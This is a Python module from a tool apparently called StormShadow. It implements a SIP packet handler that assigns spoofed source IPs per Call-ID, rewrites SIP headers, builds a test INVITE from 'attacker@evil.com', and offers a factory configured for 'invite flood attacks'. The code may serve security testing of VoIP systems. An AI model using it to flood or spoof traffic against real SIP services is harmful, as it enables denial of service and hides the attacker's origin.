"""
SIP protocol packet handler for StormShadow spoofing system.

Provides SIP-specific packet manipulation capabilities including Call-ID
management, session stickiness, and SIP packet validation with IP spoofing.
"""

import re
import uuid
import random
import ipaddress
import time
from typing import Dict, Any, Optional, Tuple, List
from .base_handler import BasePacketHandler, PacketValidationError


class SIPPacketHandler(BasePacketHandler):
    """
    SIP protocol packet handler with IP spoofing capabilities.

    Handles SIP-specific packet manipulation including:
    - Call-ID extraction and management
    - Session stickiness for SIP dialogs
    - SIP packet validation
    - Target URI extraction
    - IP address spoofing with session stickiness
    """

    # SIP header patterns
    CALL_ID_PATTERN = re.compile(rb'Call-ID:\s*([^\r\n]+)', re.IGNORECASE)
    FROM_PATTERN = re.compile(rb'From:\s*([^\r\n]+)', re.IGNORECASE)
    TO_PATTERN = re.compile(rb'To:\s*([^\r\n]+)', re.IGNORECASE)
    VIA_PATTERN = re.compile(rb'Via:\s*([^\r\n]+)', re.IGNORECASE)
    CONTACT_PATTERN = re.compile(rb'Contact:\s*([^\r\n]+)', re.IGNORECASE)
    REQUEST_LINE_PATTERN = re.compile(rb'^([A-Z]+)\s+([^\s]+)\s+SIP/2\.0', re.MULTILINE)
    URI_PATTERN = re.compile(rb'sip:([^@]+)@([^;>\s]+)', re.IGNORECASE)

    def __init__(self, config: Dict[str, Any]):
        """
        Initialize SIP packet handler.

        Args:
            config: SIP handler configuration
        """
        super().__init__(config)

        # SIP-specific configuration
        self.preserve_from_tag = config.get('preserve_from_tag', True)
        self.preserve_to_tag = config.get('preserve_to_tag', True)
        self.preserve_via_branch = config.get('preserve_via_branch', True)
        self.auto_generate_call_id = config.get('auto_generate_call_id', True)
        self.call_id_prefix = config.get('call_id_prefix', 'stormshadow-')

        # IP spoofing configuration (inspired by srcipspooferv2.py)
        self.enable_ip_spoofing = config.get('enable_ip_spoofing', True)
        self.spoof_cidr = config.get('spoof_cidr', '192.168.1.100/28')  # Default range
        self.spoof_mode = config.get('spoof_mode', 'random')  # 'random' or 'round_robin'
        self.ephemeral_port_range = config.get('ephemeral_port_range', (49152, 65535))
        
        # Initialize IP spoofing
        self._init_ip_spoofing()

    def _init_ip_spoofing(self):
        """Initialize IP spoofing functionality."""
        if self.enable_ip_spoofing:
            try:
                # Parse CIDR range
                network = ipaddress.ip_network(self.spoof_cidr, strict=False)
                self.spoof_hosts = list(network.hosts())
                self.num_hosts = len(self.spoof_hosts)
                self.host_ptr = -1  # For round-robin
                
                # Call-ID to IP mapping for session stickiness
                self.callid_to_ip: Dict[str, str] = {}
                
                # Initialize random seed
                random.seed(time.time())
                
                self.logger.info(f"IP spoofing enabled: {self.num_hosts} hosts from {self.spoof_cidr}")
            except Exception as e:
                self.logger.error(f"Failed to initialize IP spoofing: {e}")
                self.enable_ip_spoofing = False
        else:
            self.logger.info("IP spoofing disabled")

    def get_spoofed_ip(self, call_id: str) -> str:
        """
        Get spoofed IP for a Call-ID (with session stickiness).
        
        Args:
            call_id: SIP Call-ID
            
        Returns:
            Spoofed IP address as string
        """
        if not self.enable_ip_spoofing or not self.spoof_hosts:
            return "127.0.0.1"  # Fallback
            
        # Check if we already have a spoofed IP for this Call-ID
        if call_id in self.callid_to_ip:
            return self.callid_to_ip[call_id]
        
        # Generate new spoofed IP
        if self.spoof_mode == 'round_robin':
            spoofed_ip = self._roundrobin_pull_ip()
        else:  # random
            spoofed_ip = self._random_pull_ip()
        
        # Cache the mapping for session stickiness
        self.callid_to_ip[call_id] = spoofed_ip
        self.logger.debug(f"New Call-ID {call_id} -> Spoofed IP {spoofed_ip}")
        
        return spoofed_ip

    def _roundrobin_pull_ip(self) -> str:
        """Return next IP from hosts using round robin strategy."""
        self.host_ptr = (self.host_ptr + 1) % self.num_hosts
        return str(self.spoof_hosts[self.host_ptr])

    def _random_pull_ip(self) -> str:
        """Return a random IP from hosts."""
        return str(random.choice(self.spoof_hosts))

    def get_random_ephemeral_port(self) -> int:
        """Return a random ephemeral port."""
        return random.randint(self.ephemeral_port_range[0], self.ephemeral_port_range[1])

    def get_protocol_name(self) -> str:
        """Get the protocol name."""
        return 'sip'

    def get_session_identifier(self, packet_data: bytes) -> Optional[str]:
        """
        Extract Call-ID from SIP packet.

        Args:
            packet_data: Raw SIP packet data

        Returns:
            Call-ID string or None if not found
        """
        match = self.CALL_ID_PATTERN.search(packet_data)
        if match:
            call_id = match.group(1).decode('utf-8', errors='ignore').strip()
            return call_id
        return None

    def modify_packet_for_stickiness(self, original_packet: bytes,
                                   session_id: str,
                                   modification_params: Optional[Dict[str, Any]] = None) -> bytes:
        """
        Modify SIP packet to maintain session stickiness with IP spoofing.

        This ensures that all packets in a SIP dialog maintain the same Call-ID
        and other dialog-identifying headers, plus adds IP spoofing information.

        Args:
            original_packet: Original SIP packet
            session_id: Call-ID to maintain
            modification_params: Additional SIP-specific parameters

        Returns:
            Modified SIP packet with spoofing metadata
        """
        modification_params = modification_params or {}
        packet = original_packet

        # Replace or set Call-ID
        call_id_match = self.CALL_ID_PATTERN.search(packet)
        if call_id_match:
            # Replace existing Call-ID
            old_call_id = call_id_match.group(0)
            new_call_id = f"Call-ID: {session_id}".encode('utf-8')
            packet = packet.replace(old_call_id, new_call_id, 1)
        else:
            # Add Call-ID if missing (shouldn't happen in valid SIP)
            packet = self._add_header(packet, f"Call-ID: {session_id}")

        # Handle IP spoofing for session stickiness
        if self.enable_ip_spoofing:
            spoofed_ip = self.get_spoofed_ip(session_id)
            spoofed_port = self.get_random_ephemeral_port()
            
            # Store spoofing info in session context for later use
            session_context = self.get_session_context(session_id)
            if session_context is None:
                session_context = self.create_session_context(session_id, original_packet)
            
            session_context['spoofed_ip'] = spoofed_ip
            session_context['spoofed_port'] = spoofed_port
            
            # Add spoofing metadata as X-headers for tracking (can be removed in production)
            packet = self._add_header(packet, f"X-StormShadow-Spoofed-IP: {spoofed_ip}")
            packet = self._add_header(packet, f"X-StormShadow-Spoofed-Port: {spoofed_port}")
            
            self.logger.debug(f"Session {session_id} -> IP: {spoofed_ip}, Port: {spoofed_port}")

        # Handle session context preservation if available
        session_context = self.get_session_context(session_id)
        if session_context:
            target_info = session_context.get('target_info', {})

            # Preserve From tag if configured
            if self.preserve_from_tag and 'from_tag' in target_info:
                packet = self._ensure_from_tag(packet, target_info['from_tag'])

            # Preserve To tag if configured and available
            if self.preserve_to_tag and 'to_tag' in target_info:
                packet = self._ensure_to_tag(packet, target_info['to_tag'])

            # Preserve Via branch if configured
            if self.preserve_via_branch and 'via_branch' in target_info:
                packet = self._ensure_via_branch(packet, target_info['via_branch'])

        # Apply custom modifications
        for param_name, param_value in modification_params.items():
            if param_name == 'replace_request_uri':
                packet = self._replace_request_uri(packet, param_value)
            elif param_name == 'replace_from_user':
                packet = self._replace_from_user(packet, param_value)
            elif param_name == 'replace_to_user':
                packet = self._replace_to_user(packet, param_value)
            elif param_name == 'add_header':
                packet = self._add_header(packet, param_value)

        return packet

    def extract_target_info(self, packet_data: bytes) -> Dict[str, Any]:
        """
        Extract SIP target information from packet.

        Args:
            packet_data: Raw SIP packet data

        Returns:
            Dictionary containing SIP target information
        """
        info = {}

        # Extract request line info
        request_match = self.REQUEST_LINE_PATTERN.search(packet_data)
        if request_match:
            info['method'] = request_match.group(1).decode('utf-8', errors='ignore')
            info['request_uri'] = request_match.group(2).decode('utf-8', errors='ignore')

        # Extract headers
        from_match = self.FROM_PATTERN.search(packet_data)
        if from_match:
            from_header = from_match.group(1).decode('utf-8', errors='ignore')
            info['from_header'] = from_header
            info['from_tag'] = self._extract_tag(from_header)
            info['from_uri'] = self._extract_uri(from_header)

        to_match = self.TO_PATTERN.search(packet_data)
        if to_match:
            to_header = to_match.group(1).decode('utf-8', errors='ignore')
            info['to_header'] = to_header
            info['to_tag'] = self._extract_tag(to_header)
            info['to_uri'] = self._extract_uri(to_header)

        via_match = self.VIA_PATTERN.search(packet_data)
        if via_match:
            via_header = via_match.group(1).decode('utf-8', errors='ignore')
            info['via_header'] = via_header
            info['via_branch'] = self._extract_via_branch(via_header)

        contact_match = self.CONTACT_PATTERN.search(packet_data)
        if contact_match:
            contact_header = contact_match.group(1).decode('utf-8', errors='ignore')
            info['contact_header'] = contact_header
            info['contact_uri'] = self._extract_uri(contact_header)

        # Extract target IP/port from request URI or To header
        target_uri = info.get('request_uri') or info.get('to_uri')
        if target_uri:
            uri_info = self._parse_sip_uri(target_uri)
            info.update(uri_info)

        return info

    def validate_packet(self, packet_data: bytes) -> Tuple[bool, str]:
        """
        Validate SIP packet format.

        Args:
            packet_data: Raw packet data

        Returns:
            Tuple of (is_valid, error_message)
        """
        try:
            # Check for SIP request line or response line
            lines = packet_data.split(b'\r\n')
            if not lines:
                return False, "Empty packet"

            first_line = lines[0].decode('utf-8', errors='ignore')

            # Check for SIP request
            if self.REQUEST_LINE_PATTERN.match(packet_data):
                # Valid SIP request
                pass
            # Check for SIP response
            elif first_line.startswith('SIP/2.0 '):
                # Valid SIP response
                pass
            else:
                return False, "Not a valid SIP packet (missing SIP request/response line)"

            # Check for required headers
            if not self.CALL_ID_PATTERN.search(packet_data):
                return False, "Missing Call-ID header"

            if not self.FROM_PATTERN.search(packet_data):
                return False, "Missing From header"

            if not self.TO_PATTERN.search(packet_data):
                return False, "Missing To header"

            if not self.VIA_PATTERN.search(packet_data):
                return False, "Missing Via header"

            return True, "Valid SIP packet"

        except Exception as e:
            return False, f"Validation error: {str(e)}"

    def generate_call_id(self, base_identifier: Optional[str] = None) -> str:
        """
        Generate a new Call-ID for SIP sessions.

        Args:
            base_identifier: Optional base identifier to include

        Returns:
            Generated Call-ID string
        """
        if base_identifier:
            return f"{self.call_id_prefix}{base_identifier}-{uuid.uuid4().hex[:8]}"
        else:
            return f"{self.call_id_prefix}{uuid.uuid4().hex}"

    def _extract_tag(self, header_value: str) -> Optional[str]:
        """Extract tag parameter from header."""
        tag_match = re.search(r'tag=([^;>\s]+)', header_value, re.IGNORECASE)
        return tag_match.group(1) if tag_match else None

    def _extract_uri(self, header_value: str) -> Optional[str]:
        """Extract URI from header."""
        # Look for URI in angle brackets or bare URI
        uri_match = re.search(r'<([^>]+)>|sip:[^;\s]+', header_value, re.IGNORECASE)
        return uri_match.group(1) if uri_match and uri_match.group(1) else uri_match.group(0) if uri_match else None

    def _extract_via_branch(self, via_header: str) -> Optional[str]:
        """Extract branch parameter from Via header."""
        branch_match = re.search(r'branch=([^;>\s]+)', via_header, re.IGNORECASE)
        return branch_match.group(1) if branch_match else None

    def _parse_sip_uri(self, uri: str) -> Dict[str, Any]:
        """Parse SIP URI to extract components."""
        info = {}

        # Extract user and host
        match = re.search(r'sip:(?:([^@]+)@)?([^:;>\s]+)(?::(\d+))?', uri, re.IGNORECASE)
        if match:
            user, host, port = match.groups()
            if user:
                info['target_user'] = user
            info['target_host'] = host
            if port:
                info['target_port'] = int(port)
            else:
                info['target_port'] = 5060  # Default SIP port

        return info

    def _add_header(self, packet: bytes, header: str) -> bytes:
        """Add header to SIP packet."""
        lines = packet.split(b'\r\n')
        if len(lines) < 2:
            return packet

        # Insert after first line (request/response line)
        lines.insert(1, header.encode('utf-8'))
        return b'\r\n'.join(lines)

    def _replace_request_uri(self, packet: bytes, new_uri: str) -> bytes:
        """Replace request URI in SIP packet."""
        request_match = self.REQUEST_LINE_PATTERN.search(packet)
        if request_match:
            old_line = request_match.group(0)
            method = request_match.group(1).decode('utf-8', errors='ignore')
            new_line = f"{method} {new_uri} SIP/2.0".encode('utf-8')
            packet = packet.replace(old_line, new_line, 1)
        return packet

    def _replace_from_user(self, packet: bytes, new_user: str) -> bytes:
        """Replace user part in From header."""
        from_match = self.FROM_PATTERN.search(packet)
        if from_match:
            old_from = from_match.group(0)
            from_header = from_match.group(1).decode('utf-8', errors='ignore')
            # Replace user part in URI
            new_from_header = re.sub(r'sip:[^@]+@', f'sip:{new_user}@', from_header, flags=re.IGNORECASE)
            new_from = f"From: {new_from_header}".encode('utf-8')
            packet = packet.replace(old_from, new_from, 1)
        return packet

    def _replace_to_user(self, packet: bytes, new_user: str) -> bytes:
        """Replace user part in To header."""
        to_match = self.TO_PATTERN.search(packet)
        if to_match:
            old_to = to_match.group(0)
            to_header = to_match.group(1).decode('utf-8', errors='ignore')
            # Replace user part in URI
            new_to_header = re.sub(r'sip:[^@]+@', f'sip:{new_user}@', to_header, flags=re.IGNORECASE)
            new_to = f"To: {new_to_header}".encode('utf-8')
            packet = packet.replace(old_to, new_to, 1)
        return packet

    def _ensure_from_tag(self, packet: bytes, tag: str) -> bytes:
        """Ensure From header has specified tag."""
        from_match = self.FROM_PATTERN.search(packet)
        if from_match:
            old_from = from_match.group(0)
            from_header = from_match.group(1).decode('utf-8', errors='ignore')

            # Check if tag already exists
            if 'tag=' not in from_header.lower():
                # Add tag
                new_from_header = f"{from_header};tag={tag}"
            else:
                # Replace existing tag
                new_from_header = re.sub(r'tag=[^;>\s]+', f'tag={tag}', from_header, flags=re.IGNORECASE)

            new_from = f"From: {new_from_header}".encode('utf-8')
            packet = packet.replace(old_from, new_from, 1)
        return packet

    def _ensure_to_tag(self, packet: bytes, tag: str) -> bytes:
        """Ensure To header has specified tag."""
        to_match = self.TO_PATTERN.search(packet)
        if to_match:
            old_to = to_match.group(0)
            to_header = to_match.group(1).decode('utf-8', errors='ignore')

            # Check if tag already exists
            if 'tag=' not in to_header.lower():
                # Add tag
                new_to_header = f"{to_header};tag={tag}"
            else:
                # Replace existing tag
                new_to_header = re.sub(r'tag=[^;>\s]+', f'tag={tag}', to_header, flags=re.IGNORECASE)

            new_to = f"To: {new_to_header}".encode('utf-8')
            packet = packet.replace(old_to, new_to, 1)
        return packet

    def _ensure_via_branch(self, packet: bytes, branch: str) -> bytes:
        """Ensure Via header has specified branch."""
        via_match = self.VIA_PATTERN.search(packet)
        if via_match:
            old_via = via_match.group(0)
            via_header = via_match.group(1).decode('utf-8', errors='ignore')

            # Check if branch already exists
            if 'branch=' not in via_header.lower():
                # Add branch
                new_via_header = f"{via_header};branch={branch}"
            else:
                # Replace existing branch
                new_via_header = re.sub(r'branch=[^;>\s]+', f'branch={branch}', via_header, flags=re.IGNORECASE)

            new_via = f"Via: {new_via_header}".encode('utf-8')
            packet = packet.replace(old_via, new_via, 1)
        return packet

    def get_spoofing_info(self, session_id: str) -> Dict[str, Any]:
        """
        Get spoofing information for a session.
        
        Args:
            session_id: Session identifier (Call-ID)
            
        Returns:
            Dictionary containing spoofing information
        """
        session_context = self.get_session_context(session_id)
        if session_context:
            return {
                'spoofed_ip': session_context.get('spoofed_ip'),
                'spoofed_port': session_context.get('spoofed_port'),
                'original_call_id': session_id,
                'spoof_enabled': self.enable_ip_spoofing
            }
        
        return {
            'spoof_enabled': self.enable_ip_spoofing,
            'spoofed_ip': self.get_spoofed_ip(session_id) if self.enable_ip_spoofing else None,
            'spoofed_port': self.get_random_ephemeral_port() if self.enable_ip_spoofing else None
        }

    def create_test_invite_packet(self, call_id: str, from_uri: str = "sip:attacker@evil.com", 
                                 to_uri: str = "sip:victim@target.com") -> bytes:
        """
        Create a test SIP INVITE packet for testing spoofing.
        
        Args:
            call_id: Call-ID for the packet
            from_uri: From URI
            to_uri: To URI
            
        Returns:
            Raw SIP INVITE packet
        """
        invite_packet = f"""INVITE {to_uri} SIP/2.0
Via: SIP/2.0/UDP 192.168.1.100:5060;branch=z9hG4bK-{random.randint(1000, 9999)}
From: <{from_uri}>;tag={random.randint(10000, 99999)}
To: <{to_uri}>
Call-ID: {call_id}
CSeq: 1 INVITE
Contact: <sip:attacker@192.168.1.100:5060>
Content-Type: application/sdp
Content-Length: 0

""".replace('\n', '\r\n')
        
        return invite_packet.encode('utf-8')

    def get_statistics(self) -> Dict[str, Any]:
        """
        Get SIP handler statistics including spoofing information.
        
        Returns:
            Statistics dictionary
        """
        stats = super().get_statistics()
        stats.update({
            'protocol': 'sip',
            'spoofing_enabled': self.enable_ip_spoofing,
            'active_call_mappings': len(self.callid_to_ip) if hasattr(self, 'callid_to_ip') else 0,
            'spoof_cidr': self.spoof_cidr if self.enable_ip_spoofing else None,
            'spoof_mode': self.spoof_mode if self.enable_ip_spoofing else None,
            'available_hosts': self.num_hosts if hasattr(self, 'num_hosts') else 0
        })
        return stats


# Factory function for creating SIP handler (inspired by srcipspooferv2.py)
def create_inviteflood_handler(config: Optional[Dict[str, Any]] = None) -> SIPPacketHandler:
    """
    Factory function to create a SIP packet handler for invite flood attacks.
    
    Args:
        config: Configuration dictionary
        
    Returns:
        SIPPacketHandler instance configured for invite flood attacks
    """
    default_config = {
        'enable_ip_spoofing': True,
        'spoof_cidr': '192.168.1.100/28',  # 16 IP addresses
        'spoof_mode': 'random',
        'ephemeral_port_range': (49152, 65535),
        'call_id_prefix': 'inviteflood-',
        'preserve_from_tag': True,
        'preserve_to_tag': True,
        'preserve_via_branch': True
    }
    
    if config:
        default_config.update(config)
    
    return SIPPacketHandler(default_config)
